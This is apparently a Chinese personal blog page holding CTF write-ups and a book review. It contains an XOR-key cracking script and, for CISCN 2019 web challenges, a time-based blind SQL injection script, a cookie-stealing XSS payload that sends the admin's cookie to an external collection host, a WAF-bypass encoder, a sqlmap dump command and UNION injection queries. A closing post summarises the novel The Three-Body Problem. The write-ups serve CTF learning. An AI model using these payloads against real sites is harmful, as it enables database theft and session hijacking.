<p>然后就可以列出key的每一位的可能值</p>
<p>先随便选一组key异或，然后得到原文是莎翁14行诗</p>
<p>根据原文调整key即可。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ps=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM\'` ;,.'</span></span><br><span class="line">ks=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM'</span></span><br><span class="line">res=<span class="string">'1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79'</span>					<span class="comment">#res=salt^output</span></span><br><span class="line">trlen= int(len(res)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">list1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    list1.append(res[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">list2=[]                 <span class="comment">#列出key全集</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen):</span><br><span class="line"></span><br><span class="line">    list3=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ks:</span><br><span class="line">        <span class="keyword">if</span> (chr(ord(i)^int(list1[j],<span class="number">16</span>))<span class="keyword">in</span> ps):</span><br><span class="line">            list3.append(i)</span><br><span class="line">    list2.append(list3)             </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">                                      </span><br><span class="line"></span><br><span class="line">                     </span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">38</span>):          <span class="comment">#根据key[0]不为空集来爆length</span></span><br><span class="line">    x=set(list2[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen,length):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        print(length)			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">30</span>):          <span class="comment">#爆key候选集</span></span><br><span class="line">    x=set(list2[z]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(z,trlen,<span class="number">30</span>):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        y.append(x)</span><br><span class="line">print(str(y).replace(<span class="string">"&#125;,"</span>,<span class="string">"&#125;,\n"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">'W3lc0m3tOjo1nu55un1ojOt3m0cl3W'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ki=cycle(key)           <span class="comment">#看结果</span></span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">    str1+=chr(ord(next(ki))^int(each,<span class="number">16</span>))</span><br><span class="line">print(str1)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/03/De1CTF2019_ssrfme_xorz/" data-id="ck2g3l2gl000dlgv3axzmgkd3" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-Up/">Write Up</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HackWorld_2019华东北web2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/02/HackWorld_2019华东北web2/" class="article-date">
  <time datetime="2019-08-02T11:33:35.000Z" itemprop="datePublished">2019-08-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/02/HackWorld_2019华东北web2/">HackWorld_2019华东北web2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HackWorld-2019华东北web2"><a href="#HackWorld-2019华东北web2" class="headerlink" title="HackWorld_2019华东北web2"></a>HackWorld_2019华东北web2</h1><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>All You Want Is In Table ‘flag’ and the column is ‘flag’</p>
<p>Now, just give the id of passage</p>
<p>直接告诉列名和表名，显然是sql注入了。</p>
<p>发现过滤了and 空格 or /**/，然后没有回显，只有bool（false）这样的。以为是布尔盲注，但是就没见到过bool(true)的。</p>
<p>（然后继续面对wp做题）</p>
<p>拿到了柴哥的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://web43.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table=<span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;"</span></span><br><span class="line"><span class="comment">#flag&#123;5yk358dl6me5exxwo4mo2hjs5w0hadz9&#125;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        ss = time.time()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'''ELT(left((select flag from flag),&#123;&#125;)='&#123;&#125;&#123;&#125;',SLEEP(1))'''</span>.format(len(flag)+<span class="number">1</span>,flag, i)</span><br><span class="line">        &#125;</span><br><span class="line">        data[<span class="string">'id'</span>] = data[<span class="string">'id'</span>].replace(<span class="string">" "</span>,<span class="string">"\t"</span>)</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time.time()-ss&gt;=<span class="number">1</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>表示不知道是不是网络的原因，自己就成功过。于是试着把睡眠时间拉长一点，<img src="/2019/08/02/HackWorld_2019%E5%8D%8E%E4%B8%9C%E5%8C%97web2/1564734204733.png" alt="1564734204733"></p>
<p>唉，，不太行，前对都对了这么多了，还是崩了。</p>
<h4 id="leaning"><a href="#leaning" class="headerlink" title="leaning"></a>leaning</h4><p>来看看这条sql语句叭。</p>
<p>ELT(left((select flag from flag),{})=’{}{}’,SLEEP(1))’’’.format(len(flag)+1,flag, i)</p>
<p>ELT函数：</p>
<p>​    ELT(N,str1,str2,str3,…)</p>
<p>​    返回str1如果N= 1，str2 如果N= 2，等等。返回NULL如果N大于参数的数值小于1或更大。</p>
<p>这里算是ELT(bool,sleep(5))，如果bool为true，则sleep</p>
<p>left函数：</p>
<p>​        意思是截取字符串left（） 从左开始 ， left(‘张三’,1)就是说将张三这个字符串截取从第一个开始将后面的截掉 。 结果就是 张<br>​    eg： select left(‘12345’,2) 结果就是 12</p>
<p>所以这条语句，，，如果flag猜对了的话就是这样的</p>
<p>ELT(left((select flag from flag),1)=’f’,SLEEP(1))’’’</p>
<p>ELT(left((select flag from flag),2)=’fl’,SLEEP(1))’’’</p>
<p>ELT(left((select flag from flag),3)=’fla’,SLEEP(1))’’’</p>
<p>……</p>
<p>（ps：如果flag列下有多条数据，感觉应该要引入limit去查具体某一条语句。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询<span class="number">8</span>条数据，索引从<span class="number">5</span>到<span class="number">12</span>，第<span class="number">6</span>条记录到第<span class="number">13</span>条记录</span><br><span class="line">select * from t_user limit <span class="number">5</span>,<span class="number">8</span>;</span><br></pre></td></tr></table></figure>

<p>）</p>
<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>这一题。。。就完全是跟着赵师傅的wp做的了。大概就是登录后发现投稿。投搞完了呢有个反馈的，管理员亲自查看的那种。所以显然就是个xss。</p>
<p>赵师傅的xss代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">window</span>.location.href=<span class="string">'http://xss.buuoj.cn/index.php?do=api&amp;id=gX96WJ&amp;location='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;toplocation='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> top.location.href&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;cookie='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">document</span>.cookie&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)())+<span class="string">'&amp;opener='</span>+<span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span>(<span class="built_in">window</span>.opener&amp;&amp;<span class="built_in">window</span>.opener.location.href)?<span class="built_in">window</span>.opener.location.href:<span class="string">''</span>&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span><span class="string">''</span>&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>

<p>除了开头    window.location.href     这个跟xss平台自动生成的    (new Image()).src    不一样之外，其他都一样。</p>
<p>然后赵师傅知道这里有waf，于是用了HTML Markup转码</p>
<p>赵师傅exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">in_str = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> in_str:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>

<p>接着反馈那里有个MD5的验证码</p>
<p>祖传exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line">ch = string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ch:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ch:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> ch:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> ch :</span><br><span class="line">                str1=str(i)+str(j)+str(k)+str(l)</span><br><span class="line">                a=hashlib.md5(str1.encode(encoding=<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">"614c1c"</span>:</span><br><span class="line">                    print(str1)</span><br></pre></td></tr></table></figure>

<p>然后去平台收管理员cookie</p>
<p>拿到知道敏感路径扫描发现有/admin.php</p>
<p>有一个查询id的框</p>
<p>可以自然地想到是sql注入</p>
<p>发现没有任何过滤，赵师傅就用了sqlmap</p>
<p>payload</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://web59.buuoj.cn/admin.php?id=4"</span> <span class="params">--cookie=</span><span class="string">"PHPSESSID=cf49a9a60da9cc1b547ab98d549ba038"</span> -T flag <span class="params">--dump</span> <span class="params">--flush-session</span> <span class="params">--fresh-queries</span></span><br></pre></td></tr></table></figure>

<p>我的sqlmap不行啊，于是手注了，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="keyword">database</span>()	   <span class="comment">#查询数据库名</span></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ciscn'</span>		<span class="comment">#查询表名</span></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> 		<span class="comment">#查询表对应的列名</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span>  flagg <span class="keyword">from</span> flag 	<span class="comment">#查询列内容</span></span><br></pre></td></tr></table></figure>

<h4 id="leaning-1"><a href="#leaning-1" class="headerlink" title="leaning"></a>leaning</h4><p>这一题学到的更多的是思路吧，以及作为一只web狗应该有灵敏的“嗅觉”。</p>
<p>还有，，其实试过这个语句，</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,TABLE_NAME,TABLE_SCHEMA<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.TABLES<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>搜出来一堆乱七八糟的库，但用 select database() limit  却只能搜出来ciscn ，这里不是很懂（代解决） </p>
<p>然后就是xss语句都不是很懂，这个，看来还得去学学js了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/02/HackWorld_2019华东北web2/" data-id="ck2g3l2ee0001lgv37kq5ukgo" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-三体" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/02/三体/" class="article-date">
  <time datetime="2019-08-02T04:56:00.000Z" itemprop="datePublished">2019-08-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/02/三体/">三体</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    <img src="/2019/08/02/%E4%B8%89%E4%BD%93/1564721017718.png" alt="1564721017718"></p>
<p>这个暑假，读了三体一书。</p>
<p>​    粗浅的用一句话概括三体这套书，三体人想要侵略地球，人类跟他丫死磕。</p>
<p>​    故事情节跌宕起伏，勾人心弦，但三体令人着迷的地方，不单单只是因为他有一个好故事，更吸引人的地方，是他还拥有发人深思的魔力。</p>
<h3 id="三体-1"><a href="#三体-1" class="headerlink" title="三体"></a>三体</h3><p>​        故事是由三体人和人类中两个默默无闻的人引发的。分别是三体人1379号和地球人叶文洁。故事先从三体人的基本情况说起。三体人居中在距离地球4.3光年外，和人类是非常近的邻居。他们居住的星球非常坑，因为引力作用，三体星球会被拉来拉去，这会导致，这颗星球有时候特别冷，有时候特别热。只有在距离刚刚好的时候，三体文明才会蓬勃发展。还有一种极端的情况，这颗星球会被三体的引力撕裂，那么三体文明就彻底结束了。三体人所面临的问题，便是数学上非常经典的三体问题，小说名字也是由此而来。因为三体问题，三体人没有办法对未来进行准确的预测。像咱们人类都习惯了第二天早上太阳会升起来，但三体人可就没那么好命，第二天太阳是否会升起来，哪个三体人都不知道。在这种环境下，三体人还进化出了一种脱水的能力，以便在恶劣的环境中休眠，正所谓生于忧患而死于安乐，三体人疯狂的发展科技，想找到一个靠谱的星球，就像地球那样，可以在那里生活，因此三体人投入了大量的人力物力，天天仔细监听宇宙里的各种信号，不想放过一丝能找到新家园的机会。</p>
<p>​        接下来是叶文洁，就是她把三体人引过来的。叶文洁是一对中国科学家夫妻的女儿，小日子过得很幸福。但她的父亲在文革期间由于不愿意说谎认罪，被四个都是中学生的女红卫兵，用武装皮带当众抽打致死；母亲在文革中也疯了。后来叶文洁加入了建设兵团，她亲眼目睹了这群人的疯狂，山林草原都变成了荒漠。在这个过程中，他认识了一位记者，白沐林，二人成为了知己。后来这位知己想要给中央寄一封信，反映建设兵团不是在建设而是在毁坏环境。叶文洁看了信后大加赞赏，整封信内容丰富，逻辑缜密，令他信服，但这个记者长期干重活，导致手抖的厉害，于是叶文洁就帮知己重新抄了一遍，后来上级追查了下来，认为这是反动的行径。于是乎这位知己便出卖了叶文洁，说自己并不知道信的内容，这一下全部的责任都推给了叶文洁，叶文洁被关进了看守所，在看守所她拒绝签字陷害她的父亲，受到了变本加厉的迫害，这一切的丑恶让她心中的反人类种子长成了参天大树。对人类彻底的绝望了。后来叶文洁父亲的学生杨伟宁得知此事后，通过让她参与红岸基地的红岸计划救出了叶文洁。</p>
<p>​        红岸计划的主要目的是寻找外星人，以求科技飞跃，这个计划需要的人才极其苛刻，不过叶文洁的条件正好符合，但加入的代价是永远留在基地，与世隔绝。绝望的叶文洁还不犹豫地答应了。几年后，叶文洁和这位父亲的学生，自己的恩人，杨伟宁组建了家庭，生了一个女儿，杨冬。</p>
<p>​        工作期间，聪明的叶文洁利用太阳强化天线功率，向太空发出了地球的第一封信，里面包含着地球文明的基本信息。这个信号，可是三体人做梦都在找的，收到叶文洁信号的是那个叫1379号的三体人。三体的文明是高度集权的，处于极端的专制中，对个体的尊重几乎不尊重。有多不尊重呢？不能工作的人，就得死。毕竟在这种星球环境下，集权才能快速发展三体的文明。1379号孤独地生活了大半辈子，1379号所在的监听站，已经有上千年的历史了。这里只有他一个人，他每天都在一个小房子里，作者监听宇宙信号这种无聊底层的工作。在三体世界里，这是一个卑微的职业，处在社会的最底层，没有人注意他，更悲催的是，他一辈子什么也没听到。命运总是不期而遇，1379号收到了叶文洁的信号，他看到信息时非常感动，毕竟他等了一辈子，他通过自译解系统，看懂了叶文洁发来的信息，他发现这个遥远的星球，就是自己梦中的天堂，全三体人心中理想的家园。他不想把这一消息通知上级，他知道这意味着地球会被侵略，而且即便三体人成功占领地球，也和他没关系，并且一旦他完成任务，他将很有可能失去在社会中存在的价值，也就是说1379的成功，不会改变他孤独而卑微的生活，说不定还会更糟。渐渐地他爱上了这颗遥远的美丽星球，于是他给叶文洁回复了这么一段信息，不要回答，不要回答，不要回答。后面还有一段信息，大致内容如下：我是一个和平主义者，我不知道你是谁，在你的信号来源的方向，是有无数颗行星的。我们无法确定你们的位置，但只要你回复，我们一定会找到你们，我们一定会侵略地球。这一条信息，相当于把三体人千年等一回的机会给放弃了。这条信息一发出去，1379马上就给抓住了，由于1379已经很老了，元首给了他自由，想让他活到地球失去一切希望的那一天，让它美美梦破裂，这叫杀人诛心。与此同时，元首下令，处死与此相关的其余六千位三体人。</p>
<p>​        叶文洁收到外星人的回复后，惊讶不已，心跳加速，已经无法冷静思考的她，她认为人类已经没希望了，所以他想通过三体人这个外力，来帮助人类。便回复了：来吧来帮助我们吧，来侵略我们吧，我来帮你们获得地球。不久后，叶文洁的上级发现了哪里不对，知道了他是在和外星人联系。当那位上级去悬崖下面检查仪器的时候，叶文洁为了保证秘密不被泄露，冷静淡定的锯断了绳索，导致领导坠崖身亡，捎带着把自己老公也杀了。后来这个坠崖事件，被当做普通的工作事故处理了，没人对叶文洁起疑心。锯断绳子的那一刻，叶文洁就已经下定决心，从今儿起，老娘就要把革命的事业进行到底。</p>
<p>​        三体人那边，1379刚捣乱就被抓了，但叶文洁回复时却没人知道。她就在这种没人直接干预的情况下，为全人类也做了个要命的决定。叶文洁这条信息，飞了四年到达了三体星球，三体人对这突如其来的幸运，感到无比幸福。毕竟地球离得这么近，于是三体人把所有资源都用在了造飞船上，之后三体人联系上叶文洁，请她做好接应工作，这一部分就是整个故事的开端。</p>
<p>​        1379和叶文洁这两个无名小卒，一个差点让三体人对生存的机会失之交臂，而另一个给全人类带来了几百年的噩梦，在以前信息闭塞的时代，没有权势的无名小卒，是不可能影响整个世界文明的。但如今这俩人聊着天，就把各自星球的文明，翻来覆去改变了两次。这里警示了我们，让外星人知道我们在哪，是一件特别不着调的事。霍金在之前也说了几乎一样的观点，千万别跟外星人瞎联系。</p>
<p>​        文革过去了，叶文洁终于得以平反，走出了深山，并且可以回到母校任教。由于资历深，叶文洁被选中去负责发射基地的选址项目。她在西北地区认识了一个热爱大自然的国外富二代伊文思，伊文思也是后来在地球接应三体人真正负责人。他虽然富甲一方，但他依然改变不了人们对地球环境的破坏，他一样期望着通过外星人的力量来帮助人类，于是伊文思和叶文洁决定携手共创辉煌，两人成为了地球上三体组织的创始人。他们相互表达敬意，伊文思说出了以后，地球三体组织接纳新成员时必说的一句话，我们是同志了。</p>
<p>​        多年过后伊文思在秘密地在一艘巨轮上，创立了第二红岸基地，在巨轮上建立是为了方便移动便于隐藏。根据叶文洁提供的信息，伊文思与三体人建立了通讯，这里的人将叶文洁称之为最高统帅，这个反人类的组织，目的很明确，消灭人类暴政，世界属于三体。</p>
<p>​        三体人派出了一种叫智子的东西，来封锁地球的基础科学。智子是一个超级微型机器人，它非常的小，可以被加速到接近光速，只要四年多的时间，它就可以从三体行星达到地球。三体人对微观世界的研究远超人类，智子的制造原理非常晦涩难懂，三体的科学家先把复合粒子中的质子展开成二维，然后在质子宏达的二维展开面上，搭建集成电路，制造好后，再把它收缩回普通质子的大小，这样，这个微观粒子，就变成了超级智能计算机。由于智子的捣乱，国际知名组织，科学边界里很多杰出的科学家纷纷自杀，可见三体人把人类科学家逼成什么样了。经政府机构邀请，一位五大三粗，一脸横肉不修边幅的史强警察，和一名研究纳米材料的汪淼教授，开始调查此事。自杀名单中，还包括了叶文洁的女儿杨冬，家人发现了她服用了大量安眠药，死在了床上。杨冬的男友丁仪，给汪淼他们看了杨冬的遗书。遗书很简短也没签字，内容如下，物理学从来就没有存在过。将来也不会存在。我知道自己这样做是不负责任的，但别无选择。史强和汪淼这俩人，一开始像磁铁的两个正极一样合不来，但在后来的合作中，两人产生了感情。正在调查的汪淼，眼前突然出现了一组消散不去，正在倒计时的数字，这组幽灵倒计时可把汪淼折腾惨了，当他暂停了工作，去探求真相后倒计时消失了。汪淼通过射电望远镜，发现了宇宙辐射背景下的倒计时，他相信一定有某种神奇的力量，限制着人类科学。这其实也是智子搞的鬼。它不仅能限制人类的微观研究，还能展开成二维，干扰人类的宏观研究。经过深入的调查，汪淼他们发现了一款名叫三体的游戏。这游戏非常真实，其内容都是尽量还原三体人的生活环境，几经波折后，汪淼通关了游戏，收到了参加三体玩家线下聚会的消息。负责人询问各位玩家，是否同意三体人降临地球，汪淼假装同意，打入了敌人内部，进入组织内部的汪淼惊讶发现，这个组织的精神领袖，正式杨冬年迈的母亲叶文洁。不久之后，史强汪淼里应外合把地球叛军这个组织拿下了，叶文洁被活捉，随后大家便知道了第二红岸基地这艘邮轮的存在。面对这帮叛徒，干掉他们是其次的，最重要的是，获得他们与三体人的聊天记录。毕竟从聊天记录里，能掌握大量的地方情报，也能知道对手的要害在哪。</p>
<p>​        人们为了拿到这份聊天记录，费了千辛万苦，首先上船抓是不靠谱的，这帮人都是亡命徒，随时可能跟数据资料同归于尽，也不能对这艘船进行军事打击，万一炸了，那就功亏一篑了。在审问中人们得知了一个千载难逢的好机会，这艘船会在某一天经过巴拿马运河。这个运河最窄的地方就150米，史强想了个法子，在河的两边架起两根高高的杆子，在杆子上拉起了超韧性的纳米级细丝，每隔50cm拉一根，这些看不见的细丝，锋利无比。如果这艘船穿过这个纳米细丝组成的墙，船和人都会像切豆腐一样被切开，船上的任何人都来不及任何应急措施。当然，用来储存各种数据的硬盘，也会被切开，不过会被切的很平整，是可以还原的。这次行动被称为古筝计划。古筝计划非常成功，这艘船像一叠扑克牌一样，刷的一下就分开了，变成了千层糕，船被切成了50厘米的薄片，伊文思也被切成了三段。人们在船的废墟里，找到了想要的资料，一共有28个G，人们仔细研究了这些资料，得到了两个非常重要的情报。</p>
<p>​        一个大的坏消息是，智子除了封锁人类科技发展，它还是个超级监视器，它利用自己的光速移动能力监视所有人，干扰各别科学家的视神经，每一个人类说的每一句话，做的每一件事，三体人都在全程看直播。如此重要的情报，让人类知道任何开会讨论出来的计划，都会被三体人知道。古筝计划的成功，其实是三体人为了借人类的手，消灭这帮地球叛军的计划。因为三体人的思想是透明的，他们通过思维直接交流，不会撒谎，当他们得知人类有撒谎这个技能后，非常的恐惧。人类在得知有智子这个东西后，智子就不能再干扰人类的宏观观测了，因为它一旦在展开成二维，就很可能被人类消灭。之前汪淼和一些科学家眼前的幽灵倒计时，就是指在在人视网膜上搞的把戏。第二个情报是，在地球上三体人怕一个人类，而且只怕这一个人，地球叛军曾经多次想要杀死他，这个人，就是罗辑。</p>
<p>​        这个故事告诉我们，如果发现组织里有叛徒，最关键的不是消灭它，而是获取敌方高价值的信息，如果叛徒这个棋子用的好，你会比敌人更有利。</p>
<p>​        后来人类所发展的所有战略， 都是基于这两个信息：地球上有个叫智子的机器人在捣乱，和三体想杀一个叫罗辑的男人。人们紧急召开了国际会议，讨论如何应对危机，此时三体人通过智子，给每个人眼前显示出了相同的文字，你们是虫子。</p>
